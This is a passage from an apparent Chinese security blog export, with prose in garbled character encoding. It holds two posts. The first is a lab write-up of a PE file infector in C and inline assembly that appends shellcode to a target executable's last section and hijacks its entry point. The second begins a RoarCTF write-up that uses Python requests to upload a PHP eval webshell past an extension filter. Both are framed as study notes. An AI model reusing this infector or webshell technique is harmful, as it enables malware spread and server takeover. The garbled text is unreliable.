ä¸ºshellcodeéƒ½åœ¨æ­¤èŠ‚å†…å­˜ç€ã€‚ç„¶åè°ƒç”¨MapFileToMemoryå‡½æ•°å¾—åˆ°æ˜ å°„è§†å›¾æ–‡ä»¶çš„å¼€å§‹åœ°å€å€¼å¹¶èµ‹å€¼ç»™pBaseï¼Œç„¶åè°ƒç”¨PutShellcodeToLastSection_0å‡½æ•°å¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œæ„ŸæŸ“ï¼ŒæˆåŠŸæ„ŸæŸ“ä¹‹åï¼Œè°ƒç”¨WriteToFileå‡½æ•°åœæ­¢å½“å‰ç¨‹åºçš„ä¸€ä¸ªå†…å­˜æ˜ å°„ï¼Œå°†æ˜ åƒåˆ°å†…å­˜ä¸­çš„æ–‡ä»¶å†™å›ç£ç›˜ã€‚ 6ã€MapFileToMemoryä»£ç å¦‚ä¸‹ï¼š void * MapFileToMemory(DWORD * ApiAddressArray, char * FileName ){ HANDLE hFile, hMapping; DWORD FileSize; MyCreateFileA f_CreateFileA; MyGetFileSize f_GetFileSize; MyCreateFileMappingA f_CreateFileMappingA; MyMapViewOfFile f_MapViewOfFile; MyCloseHandle f_CloseHandle; void * pBase; f_CreateFileA = (MyCreateFileA) (*(ApiAddressArray + CreateFileA_OFFSET)); f_GetFileSize = (MyGetFileSize) (*(ApiAddressArray + GetFileSize_OFFSET)); f_CreateFileMappingA = (MyCreateFileMappingA) (*(ApiAddressArray + CreateFileMapping_OFFSET)); f_MapViewOfFile = (MyMapViewOfFile) (*(ApiAddressArray + MapViewOfFile_OFFSET)); f_CloseHandle = (MyCloseHandle) (*(ApiAddressArray + CloseHandle_OFFSET)); hFile = f_CreateFileA(FileName, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);//æ‰“å¼€è¦æ„ŸæŸ“çš„ç›®æ ‡æ–‡ä»¶ï¼Œå¹¶ç”¨hFileå¥æŸ„ä¸ä¹‹å…³è” if (hFile == INVALID_HANDLE_VALUE) { return NULL; } FileSize = f_GetFileSize(hFile,NULL);//è·å–æ–‡ä»¶å¤§å° //åˆ›å»ºæ–‡ä»¶æ˜ å°„ if (!(hMapping = f_CreateFileMappingA(hFile, 0, PAGE_READWRITE | SEC_COMMIT, 0, FileSize + 20*1024, 0))) //ä¸ºä½•é«˜32ä½ä¸º0ï¼Œä½32ä½è¿™ä¹ˆå¤§ï¼Ÿ { f_CloseHandle(hFile); //CreateFileMappingAè¿”å›0åˆ™åˆ›å»ºå¤±è´¥ï¼Œå…³é—­å¥æŸ„ return NULL; } //å°†æ–‡ä»¶å†…å®¹æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œå¹¶è·å–å†…å­˜çš„é¦–åœ°å€ï¼Œå†™å…¥m_BasePointerï¼Œæ˜ å°„æ–¹å¼ï¼šå°†æ–‡ä»¶æ˜ å°„å¯¹è±¡hMappingæ˜ å°„åˆ°å½“å‰åº”ç”¨ç¨‹åºçš„åœ°å€ç©ºé—´ if (!(pBase = f_MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0))) { f_CloseHandle(hMapping); //å¦‚æœè¿”å›0åˆ™æ˜ å°„å¤±è´¥ï¼Œå¹¶å…³é—­ä¸¤ä¸ªå¥æŸ„ï¼ŒæˆåŠŸåˆ™è¿”å›æ˜ å°„è§†å›¾æ–‡ä»¶çš„å¼€å§‹åœ°å€å€¼åˆ°pBase f_CloseHandle(hFile); return NULL; } f_CloseHandle(hMapping); f_CloseHandle(hFile); return pBase;} æ­¤å‡½æ•°é€šè¿‡è°ƒç”¨CreateFileAã€GetFileSizeã€CreateFileMappingAã€MapViewOfFileã€CloseHandleç­‰APIï¼Œå°†æŒ‡å®šçš„æ–‡ä»¶æ‰“å¼€ï¼Œå¦‚æœæˆåŠŸæ‰“å¼€æ–‡ä»¶ï¼Œåˆ™è·å–æ–‡ä»¶çš„å¤§å°ï¼Œç„¶åå°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜å¹¶è·å–æ˜ å°„åˆ°å†…å­˜ä¸­çš„é¦–åœ°å€ï¼Œå¹¶è¿”å›ç»™pBaseã€‚ 7ã€PutShellcodeToLastSection_0ä»£ç å¦‚ä¸‹ï¼š BOOL PutShellcodeToLastSection_0(void * pBase,char * pVirus,DWORD VirusSize){ int addsize; int temp; IMAGE_DOS_HEADER * dos_head; PIMAGE_SECTION_HEADER pLastSectionInfo; IMAGE_NT_HEADERS32 * pPeHeader; DWORD CopyPos; DWORD OldEntryPointRVA; dos_head = (IMAGE_DOS_HEADER *)pBase; //åŸºå€æŒ‡å‘å¯æ‰§è¡Œæ–‡ä»¶çš„doså¤´ pPeHeader = (IMAGE_NT_HEADERS32 *)((char *)dos_head + dos_head-&gt;e_lfanew);//å¾—åˆ°PEæ–‡ä»¶å¤´çš„ä½ç½® pLastSectionInfo = GetLastSectionInfo(pBase); if (!IfLastSectionCanBeInfected(pLastSectionInfo)) return FALSE; if ((addsize = NeedLastSectionEnlargeSize(pLastSectionInfo,VirusSize)) != 0)//éœ€è¦æ‰©å¤§èŠ‚çš„å¤§å° { temp = AlignToFile(pPeHeader,pLastSectionInfo-&gt;SizeOfRawData + addsize); pPeHeader-&gt;OptionalHeader.SizeOfImage += AlignToSection(pPeHeader,temp) - AlignToSection(pPeHeader,pLastSectionInfo-&gt;SizeOfRawData); pLastSectionInfo-&gt;SizeOfRawData = temp; } //ä¿®æ”¹èŠ‚å±æ€§ï¼Œä½¿ä¹‹å±äºå¯æ‰§è¡ŒèŠ‚ pLastSectionInfo-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE ; //è®¾å®šæ–°çš„å…¥å£ç‚¹ï¼ŒæŒ‡å‘ç—…æ¯’shell OldEntryPointRVA = pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint;//è®°å½•æ—§çš„å…¥å£ç‚¹ pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint = GetShellcodeRVA(pLastSectionInfo); //æŠŠç—…æ¯’shellæ‹·è´åˆ°å°¾èŠ‚çš„ä½ç½® CopyPos = GetShellcodeRawPos(pLastSectionInfo); pLastSectionInfo-&gt;Misc.VirtualSize += VirusSize; for(temp = 0; temp &lt; VirusSize; temp++) ((char *)pBase)[CopyPos + temp] = pVirus[temp];//åœ¨æ–‡ä»¶ä¸­æœ€åä¸€èŠ‚åé¢é€ä¸ªå†™å…¥è®¾ç«‹äº†code *((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; //åœ¨æœ€åä¸€èŠ‚çš„EntryPointPoså¤§å°çš„åç§»å¤„å†™å…¥æ—§çš„å…¥å£ç‚¹ return TRUE;} è¯¥å‡½æ•°åˆ©ç”¨ä¸Šä¸€ä¸ªå‡½æ•°ä¼ å›çš„pBaseï¼Œä»¥åŠVirusStartå’ŒVirusSizeï¼Œå°†æŒ‡å®šä½ç½®å’Œé•¿åº¦çš„shellcodeå†™å…¥pBaseæŒ‡å‘çš„æ–‡ä»¶å†…å­˜æ˜ å°„ä¸­ã€‚ç”±å‡½æ•°çš„å‰åŠéƒ¨åˆ†ä»£ç é€»è¾‘æˆ‘ä»¬å¯çŸ¥ï¼Œè¯¥å‡½æ•°å…ˆé€šè¿‡pBaseå¾—åˆ°å¾…æ„ŸæŸ“æ–‡ä»¶çš„DOSå¤´ï¼Œç„¶ååˆ©ç”¨å¦‚å›¾çš„ç»“æ„æ‰¾åˆ°PEå¤´ç„¶ååˆ©ç”¨IfLastSectionCanBeInfectedå‡½æ•°åˆ¤æ–­æ–‡ä»¶çš„æœ€åä¸€èŠ‚æ˜¯å¦å¯ä»¥è¢«æ„ŸæŸ“ï¼Œå‡½æ•°ä¸»è¦åˆ¤æ–­æœ€åä¸€èŠ‚æ˜¯å¦æ—¶å¯ä¸¢å¼ƒçš„æˆ–è€…è¯¥å—çš„å¤§å°æ˜¯å¦è¶…è¿‡äº†ç‰©ç†å¤§å°è€Œåˆ¤æ–­æ˜¯å¦å¯ä»¥è¢«æ„ŸæŸ“ã€‚æŸä¸€èŠ‚å—æ˜¯å¦èƒ½è¢«æ„ŸæŸ“çš„å±æ€§å¦‚ä¸‹å›¾ï¼šåˆ¤æ–­äº†æ˜¯å¦èƒ½è¢«æ„ŸæŸ“ä¹‹åï¼Œå¦‚æœå¯ä»¥è¢«æ„ŸæŸ“ï¼Œåˆ™è°ƒç”¨NeedLastSectionEnlargeSizeå‡½æ•°åˆ¤æ–­æœ€åä¸€èŠ‚çš„å¤§å°æ˜¯å¦è¶³å¤Ÿå†™å…¥shellcodeï¼Œå‡½æ•°è¿”å›é›¶åˆ™ä¸å¿…æ‰©å¤§ï¼Œè¿”å›å¤§äº0çš„å€¼å³ä¸ºéœ€è¦æ‰©å¤§çš„å°ºå¯¸ï¼Œä¾¿ç»§ç»­æ‰§è¡Œä»£ç åˆ©ç”¨AlignToFileå’ŒAlignToSectionè¿›è¡Œæ‰©å¤§èŠ‚çš„æ“ä½œã€‚æ­¤è¿‡ç¨‹ç»“æŸåï¼Œä¾¿å¯ä»¥æ­£å¼è¿›è¡Œshellcodeå†™å…¥äº†ï¼Œä»£ç ï¼š //ä¿®æ”¹èŠ‚å±æ€§ï¼Œä½¿ä¹‹å±äºå¯æ‰§è¡ŒèŠ‚pLastSectionInfo-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE ;//è®¾å®šæ–°çš„å…¥å£ç‚¹ï¼ŒæŒ‡å‘ç—…æ¯’shellOldEntryPointRVA = pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint;//è®°å½•æ—§çš„å…¥å£ç‚¹pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint = GetShellcodeRVA(pLastSectionInfo);//æŠŠç—…æ¯’shellæ‹·è´åˆ°å°¾èŠ‚çš„ä½ç½®CopyPos = GetShellcodeRawPos(pLastSectionInfo);pLastSectionInfo-&gt;Misc.VirtualSize += VirusSize;for(temp = 0; temp &lt; VirusSize; temp++) ((char *)pBase)[CopyPos + temp] = pVirus[temp];//åœ¨æ–‡ä»¶ä¸­æœ€åä¸€èŠ‚åé¢é€ä¸ªå†™å…¥è®¾ç«‹äº†code*((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; //åœ¨æœ€åä¸€èŠ‚çš„EntryPointPoså¤§å°çš„åç§»å¤„å†™å…¥æ—§çš„å…¥å£ç‚¹ è¯¥éƒ¨åˆ†ä»£ç å…ˆå¯¹èŠ‚çš„å±æ€§è¿›è¡Œä¿®æ”¹ï¼Œä½¿ä¹‹æˆä¸ºå¯æ‰§è¡Œçš„ï¼Œç„¶åè®°å½•æ—§çš„å…¥å£ç‚¹åˆ°OldEntryPointRVAï¼Œå¹¶é€šè¿‡GetShellcodeRVAå‡½æ•°æ‹¿åˆ°å†™å…¥shellcodeä¹‹åçš„æ–°å…¥å£ç‚¹ã€‚ç„¶ååˆ©ç”¨GetShellcodeRawPoså‡½æ•°å¾—åˆ°å†™å…¥shellcodeçš„ä½ç½®ï¼Œå³æœ€åä¸€èŠ‚çš„æœ«å°¾å¤„ï¼Œè‡³æ­¤ä¾¿æ­£å¼è¿›è¡Œshellcodeçš„å†™å…¥ï¼Œåˆ©ç”¨forå¾ªç¯å°†shellcodeå†™å…¥æ–‡ä»¶ã€‚ å…³é”®ç‚¹ä¹‹ä¸€ï¼šEntryPointPosè¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œåœ¨EntryPointPosåç§»å¤„å†™å…¥ç¨‹åºåŸæ¥çš„å…¥å£ç‚¹ï¼ŒEntryPointPosåœ¨é¡¹ç›®ä¸­èµ·å§‹çš„èµ‹å€¼ä¸º0xeaï¼Œå³234å­—èŠ‚çš„åç§»ï¼Œè¿™é‡Œæˆ‘ä»¬ç€é‡è®²ä¸€ä¸‹:é€šè¿‡åˆ†æè¢«å†™å…¥çš„shellcodeçš„ç»“æ„ï¼Œå¦‚ä¸‹å›¾ï¼šè®¡ç®—å¾—çŸ¥ï¼Œçº¢çº¿ä»¥ä¸Šéƒ¨åˆ†å­˜å…¥çš„æ˜¯ä¸»å‡½æ•°ä¸­çš„push 89898989h(ä¸ºå†™å…¥æ—§çš„å…¥å£ç‚¹ä¿ç•™çš„å››å­—èŠ‚ç©ºé—´)å‰çš„234å­—èŠ‚çš„æ±‡ç¼–æŒ‡ä»¤å’Œæ•°æ®ï¼šå‡½æ•°åå’Œå‡½æ•°çš„åœ°å€ï¼ˆå‡½æ•°çš„åœ°å€å†™å…¥åˆ°äº†å‡½æ•°åæ•°ç»„å‘ååç§»160ä¸ªå­—èŠ‚çš„ä½ç½®ï¼‰ï¼Œè€Œ89898989hå¤„çš„å››ä¸ªå­—èŠ‚åˆ™æ˜¯é€šè¿‡ä¸‹é¢çš„ä»£ç è¢«è¦†ç›–æˆå‡½æ•°åŸæ¥çš„å…¥å£ç‚¹çš„åœ°å€ï¼š *((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; è¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œå› ä¸ºå½“æˆ‘ä»¬éœ€è¦å‘å‡½æ•°åæ•°ç»„ä¸­åŠ å…¥æ–°çš„APIå‡½æ•°åæ—¶ï¼Œå­˜å‚¨å‡½æ•°åœ°å€çš„ç©ºé—´ä¹Ÿä¼šå˜å¤§ï¼Œé‚£ä¹ˆå†™å…¥89898989hçš„ä½ç½®åˆ™ä¼šå‘åç§»åŠ¨ï¼Œæ¬²è¦†ç›–æ­¤ä½ç½®åˆ™éœ€è¦æ”¹å˜EntryPointPosçš„å¤§å°ï¼Œä»è€Œä¿è¯èƒ½å¤Ÿæ­£ç¡®è·³è½¬ä¼šåŸå…¥å£ç‚¹ä½¿ç¨‹åºæ­£å¸¸è¿è¡Œã€‚ 8ã€mainæœ€åçœ‹ä¸€ä¸‹ä¸»å‡½æ•°ï¼š __declspec(naked) void MyEntryPoint(){ _asm { pushad //å°†æ‰€æœ‰çš„32ä½é€šç”¨å¯„å­˜å™¨å‹å…¥å †æ ˆ pushfd //ç„¶åå°†32ä½æ ‡å¿—å¯„å­˜å™¨EFLAGSå‹å…¥å †æ ˆ call L1 //åˆ©ç”¨call/popç»„åˆå‹å…¥æ•°æ® } _MYDATA _asm {L1: pop ebx } RealBegin(); _asm { popfd //32ä½æ ‡å¿—å¯„å­˜å™¨å‡ºæ ˆ popad //32ä½é€šç”¨å¯„å­˜å™¨å‡ºæ ˆ mov eax,fs:[30h] mov eax,[eax + 08h] cmp dword ptr [eax + 2],'xxxx' //åˆ¤æ–­æ˜¯å¦æ˜¯è‡ªèº«ç¨‹åº jz L2 //å¦‚æœæ‰¾åˆ°äº†æ ‡å¿—ï¼Œç¨‹åºç»“æŸ push 89898989h //ä¸ºç¨‹åºåŸå…¥å£ç‚¹å¼€è¾Ÿå››ä¸ªå­—èŠ‚çš„ç©ºé—´L2: ret }} ä¸»å‡½æ•°åˆ©ç”¨call/popç»„åˆå°†_MYDATAä¸­å­˜æ”¾çš„å‡½æ•°åå‹å…¥æ ˆï¼Œç„¶åè°ƒç”¨RealBeginå‡½æ•°å®ç°æ¶æ„ä»£ç çš„æ³¨å…¥ï¼ŒRealBeginå‡½æ•°ä¸­éƒ½æ˜¯åˆ©ç”¨å‰é¢æåˆ°çš„å‡½æ•°æ¥å®ç°åŠŸèƒ½ï¼Œä¸è¿‡çš„èµ˜è¿°ã€‚è¿™é‡Œï¼Œé€šè¿‡æ¯”å¯¹é­”æ•°MZåå››ä¸ªå­—èŠ‚çš„å€¼æ˜¯å¦ä¸ºxxxxæ¥åˆ¤æ–­ç¨‹åºæ˜¯æˆ‘ä»¬å†™çš„æ¶æ„ç¨‹åºæœ¬èº«è¿˜æ˜¯è¢«æ„ŸæŸ“çš„å‡½æ•°ï¼Œä»è€Œæ ¹æ®åˆ¤æ–­ç»“æœå†³å®šé€€å‡ºæ‰§è¡Œè¿˜æ˜¯å†™å…¥89898989hè¿™ä¸ªå­˜æ”¾å…¥å£ç‚¹çš„ä½ç½®ã€‚ å…¶ä»–å…³é”®å†…å®¹åœ¨ç¼–å†™å’Œå®Œå–„ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œå¾ˆå¤šç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œå¦åˆ™å°±ä¼šå‡ºç°éš¾ä»¥é¢„æœŸçš„é—®é¢˜ï¼Œæˆ‘åœ¨å®éªŒè¿‡ç¨‹ä¸­é‡åˆ°çš„å‡ ä¸ªå…³é”®é—®é¢˜å¦‚ä¸‹ï¼š1ã€è®¾ç½®VirusSizeçš„å¤§å°å¯¹VirusSizeè¿›è¡Œè®¾ç½®ï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å…ˆè®¾ç½®ä¸ªé€‚å½“å¤§ç‚¹çš„å€¼0x2000ï¼Œè°ƒè¯•ä¹‹åæŸ¥çœ‹ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„textèŠ‚çš„å¤§å°ï¼Œç„¶ååº”å½“ç”¨æ‰©å¤§ä¹‹åæ›¿æ¢VirusSizeä¹‹å‰çš„å€¼ã€‚ç”±å›¾å¯çŸ¥å¯ä»¥å°†VirusSizeè®¾ç½®ä¸ºæ¯”0x838ç¨å¾®å¤§çš„å€¼ï¼Œä»¥å…æ„ŸæŸ“æ–‡ä»¶å†™å…¥shellcodeæ—¶å†™ä¸å…¨ã€‚ä¸è¿‡è®¾ç½®çš„å†å¤§äº›ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œå‰ææ˜¯èƒ½å­˜ä¸‹shellcodeã€‚2ã€åç§»EntryPointPosçš„è®¾ç½®ä»£ç ä¸­å¯¹EntryPointPosçš„å®šä¹‰å¦‚ä¸‹ï¼š #define EntryPointPos 0xf2 //0xea=234ã€0xf2=242ï¼Œè¿™ä¸ªæ˜¯å†™å…¥åŸå…¥å£ç‚¹çš„ä½ç½®ï¼Œå¦‚æœè¯»å…¥åˆ«çš„å‡½æ•°åœ°å€ï¼Œè¿™ä¸ªåç§»éœ€è¦æ›´æ”¹ï¼Œè¿™é‡Œä¸ºäº†å¼¹å‡ºçª—å£ï¼Œ//æˆ‘ä»¬åˆè¯»å…¥äº†ä¸¤ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå› æ­¤å‘åå¤šåç§»äº†8ä¸ªå­—èŠ‚ï¼Œæ•…å…¥å£ç‚¹å†™å…¥çš„ä½ç½®ä¹Ÿè¦å‘ååç§»8ä¸ªå­—èŠ‚ã€‚ å‰é¢æåˆ°äº†è¿™æ˜¯è®°å½•å†™å…¥åŸå…¥å£ç‚¹åœ°å€åç§»çš„åœ°æ–¹ï¼Œæ¯”å¦‚å½“è¯»å–10ä¸ªå‡½æ•°çš„åœ°å€çš„æ—¶å€™ï¼Œè¯¥åç§»å¤§å°ä¸º0xeaæ°å¥½èƒ½åç§»åˆ°89898989hçš„åœ°æ–¹ï¼Œç„¶åè¦†ç›–æˆä¸ºåŸå…¥å£ç‚¹åœ°å€ï¼Œè€Œå½“æˆ‘ä»¬åˆå¤šè¯»å–äº†ä¸¤ä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆ89898989hä¹Ÿå°†ä¼šå‘åç§»åŠ¨8ä¸ªå­—èŠ‚ï¼ˆè¿™ä¸€ç‚¹æ˜¯ä¸ä¸€å®šçš„ï¼Œå› ä¸ºæˆ‘ä»¬åŠ å…¥ä¸¤ä¸ªå‡½æ•°åï¼Œ160ä¸ªå­—èŠ‚å¤§å°çš„æ•°ç»„ç©ºé—´è¶³å¤Ÿæ”¾ä¸‹å‡½æ•°åï¼Œæ•…API_ADDRESS_OFFSETçš„å€¼160ä¸ç”¨å˜ï¼Œè€Œå½“éœ€è¦åŠ å…¥å…¶å®ƒAPIåçš„æ—¶å€™ï¼Œ160ä¸ªå­—èŠ‚å­˜ä¸ä¸‹å‡½æ•°åæ—¶ï¼Œè¿™ä¸ªåœ°æ–¹ä¹Ÿè¦æ‰©å¤§ï¼Œå‘ååç§»çš„å¤§å°ä¼šæ›´å¤§ï¼Œæ‰€ä»¥éœ€è¦æ ¹æ®å®é™…æƒ…å†µæ¥åˆ†æï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è§‚å¯Ÿæ–‡ä»¶ç»“æ„æ¥åˆ†æï¼Œæ›´ä¸ºç›´è§‚ï¼š 1ã€é¦–å…ˆï¼Œæˆ‘ä»¬å†™å…¥æ–°çš„ä¸¤ä¸ªå‡½æ•°ä¹‹åï¼Œä¸å¯¹EntryPointPosè¿›è¡Œæ›´æ”¹ï¼Œé‚£åŸç¨‹åºçš„å…¥å£ç‚¹ï¼ˆå®éªŒä¸­ç”¨åˆ°çš„calc.exeçš„åŸå§‹å…¥å£ç‚¹çš„VAä¸º01012475hï¼‰å°†ä¼šä»ç„¶è¢«å†™åˆ°åç§»ä¸º0xeaçš„åœ°æ–¹ï¼Œè€Œ89898989hå°†ä¼šå­˜åœ¨äºåé¢å‡ ä¸ªå­—èŠ‚çš„åœ°æ–¹ï¼Œå¦‚å›¾ï¼šçº¢è‰²æ¡†å†…æ˜¯å…¥å£ç‚¹å†™å…¥åˆ°0xeaä¸ªåç§»çš„ä½ç½®ï¼Œé»„è‰²æ ‡è®°æ˜¯89898989hè¢«å†™å…¥çš„åœ°æ–¹ï¼Œæ²¡æœ‰æˆåŠŸè¢«è¦†ç›–ï¼Œå› æ­¤è¢«æ„ŸæŸ“çš„ç¨‹åºæœ€ååªèƒ½èœ‚é¸£è€Œä¸èƒ½æ­£å¸¸è¿è¡Œã€‚ 2ã€ä¿®æ”¹ç¨‹åºï¼Œå°†EntryPointPosæ”¹ä¸º0xf2(242)ï¼Œç„¶åå†æ¬¡æ„ŸæŸ“ï¼Œçœ‹ä¸€ä¸‹æ•ˆæœï¼šæˆ‘ä»¬å‘ç°01012475hè¢«å†™å…¥åˆ°åŸæ¥çš„89898989hä½ç½®ï¼Œç»è¿‡æµ‹è¯•ï¼ŒæˆåŠŸæ„ŸæŸ“ã€‚æ­¤æ—¶ä¾¿èƒ½åˆ©ç”¨LoadLibraryAå’ŒGetProcAddresså‡½æ•°æ‰¾åˆ°MessageBoxAè¿›è¡Œå¼¹çª—ã€‚ æ€»ç»“è‡ªå·±åœ¨æœ¬æ¬¡å®éªŒä¸­æ·±åˆ»å­¦ä¹ äº†æ„ŸæŸ“ç›®æ ‡ç¨‹åºçš„æœºåˆ¶ï¼Œå…³é”®ç‚¹å°±åœ¨äºï¼šå†™å…¥shellcodeã€æ›´æ”¹å…¥å£ç‚¹ç­‰ä¸»è¦ä½œç”¨çš„å®ç°éƒ½ç¦»ä¸å¼€å¯¹PEæ–‡ä»¶ç»“æ„çš„æ“ä½œã€‚åŸºç¡€ä¸ç‰¢ã€åœ°åŠ¨å±±æ‘‡å‘€ï¼æœ€åå†æ¬¡å£°æ˜ï¼šæœ¬ç¯‡åšå®¢åªç”¨äºè®°å½•å­¦ä¹ ï¼","link":"/2020/02/03/MaliciousCode-FileInfect/"},{"title":"RoarCTF-simple_upload-WriteUp","text":"è¯è¯´â€¦è¿™ä¸ªé¢˜ä»æ‰“æ¯”èµ›åˆ°åæ¥çš„å¤ç°ï¼Œä¸€ç›´æƒ³ç€æ˜¯çˆ†ç ´æ–‡ä»¶åï¼Œä½†æ˜¯ä¹Ÿä¸€ç›´æ²¡è·‘å‡ºæ¥ï¼Œæ¡ä»¶ç«äº‰åˆç«äº‰ä¸è¿‡â€¦åæ¥å¶ç„¶æ‰å‘ç°å¦ä¸€ç§æ€è·¯ï¼Œæ–°å¤§é™†ğŸ§ RoarCTF-simple_upload tipï¼šè¯¥é¢˜ç›®åœ¨BUUCTFçš„é¢˜åº“é‡Œæœ‰ç¯å¢ƒå¯å¤ç°ï¼šhttps://buuoj.cn é¢˜ç›®æè¿°æ‰“å¼€é¢˜ç›®é“¾æ¥ä¹‹åï¼Œçœ‹åˆ°å¦‚ä¸‹ä»£ç  &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller{ public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), \".php\") ) { return false; } $upload = new \\Think\\Upload();// å®ä¾‹åŒ–ä¸Šä¼ ç±» $upload-&gt;maxSize = 4096 ;// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å° $upload-&gt;allowExts = array('jpg', 'gif', 'png', 'jpeg');// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹ $upload-&gt;rootPath = './Public/Uploads/';// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½• $upload-&gt;savePath = '';// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½• $info = $upload-&gt;upload() ; if(!$info) {// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯ $this-&gt;error($upload-&gt;getError()); return; }else{// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯ $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(\"url\"=&gt;$url,\"success\"=&gt;1)); } }} å¯ä»¥å‘ç°ï¼Œè¯¥ç«™æ˜¯ThinkPHPå†™çš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç½‘ç«™ã€‚ é¢˜ç›®åˆ†æ 1ã€åˆ†æä»£ç å¯çŸ¥ï¼Œè¯¥ç«™å¯ä»¥é€šè¿‡POSTæ–¹æ³•å®ç°ä¸Šä¼ æ–‡ä»¶åŠŸèƒ½ï¼Œä½†æ˜¯ä»ç¬¬14è¡Œä»£ç å‘ç°phpåç¼€çš„æ–‡ä»¶è¢«ç¦æ­¢ä¸Šä¼ ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•ç»•è¿‡é™åˆ¶ï¼Œä¸Šä¼ phpå°é©¬ã€‚ 2ã€è¯¥è„šæœ¬é€šè¿‡allowExtsæ–¹æ³•è®¾ç½®ä¸Šä¼ ç±»å‹ï¼Œä½†æ˜¯æŸ¥é˜…èµ„æ–™å¾—çŸ¥è¿™ç§ä½¿ç”¨æ–¹æ³•æ˜¯ä¸å¯¹çš„ï¼Œå¹¶ä¸èƒ½é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ã€‚ 3ã€upload()å‡½æ•°ä¸ä¼ å‚æ—¶ä¸ºå¤šæ–‡ä»¶ä¸Šä¼ ï¼Œæ•´ä¸ª$_FILESæ•°ç»„çš„æ–‡ä»¶éƒ½ä¼šä¸Šä¼ ä¿å­˜ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å±æ€§é€šè¿‡ä¸€æ¬¡è®¿é—®ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ã€‚ç»“åˆä»¥ä¸Šåˆ†æå¾—çŸ¥çš„å†…å®¹å¯çŸ¥ï¼Œå¯ä»¥åˆ©ç”¨$_FILESæ•°ç»„ä¸Šä¼ å¤šä¸ªæ–‡ä»¶æ¥ç»•è¿‡å¯¹phpçš„è¿‡æ»¤ã€‚ è§£é¢˜è¿‡ç¨‹1ã€æµ‹è¯•ä¸Šä¼ åŠŸèƒ½é¦–å…ˆç¼–å†™pythonè„šæœ¬å‘ç½‘ç«™POSTä¸€ä¸ªéphpçš„æ–‡ä»¶ï¼Œè¿™é‡Œä¸Šä¼ äº†ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œæµ‹è¯•èƒ½å¦æ­£å¸¸ä¸Šä¼ æ–‡ä»¶ï¼Œä¸‹é¢æ˜¯ä¸Šä¼ æµ‹è¯•ä»£ç æ®µï¼š url = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello')}r = requests.post(path, files=files)print(r.text) å›æ˜¾å†…å®¹å¦‚ä¸‹: {\"url\":\"\\/Public\\/Uploads\\/2019-10-24\\/5db1841fb439d.txt\",\"success\":1} èƒ½å¤ŸæˆåŠŸä¸Šä¼ æ–‡ä»¶ã€‚ 2ã€æµ‹è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼šurl = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello'), \"file1\":(\"ma.php\", '&lt;?php eval($_GET[\"cmd\"]);')}r = requests.post(path, files=files) å›æ˜¾å†…å®¹å¦‚ä¸‹ï¼š {\"url\":\"\\/Public\\/Uploads\\/2019-10-24\\/5db18420027a3.txt\",\"success\":1}{\"url\":\"\\/Public\\/Uploads\\/\",\"success\":1} ç”±å›æ˜¾å¯çŸ¥ï¼Œæˆ‘ä»¬æˆåŠŸä¸Šä¼ äº†phpæ–‡ä»¶,ä½†æ˜¯å¹¶æ²¡æœ‰å›æ˜¾phpçš„æ–‡ä»¶å å…¶å®åœ¨æ¯”èµ›åšèµ›é¢˜çš„æ—¶å€™å‘ç°ï¼Œç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥æˆåŠŸçš„ï¼Œåªä¸è¿‡ä¹Ÿä¸ä¼šå›æ˜¾æ–‡ä»¶åã€‚ 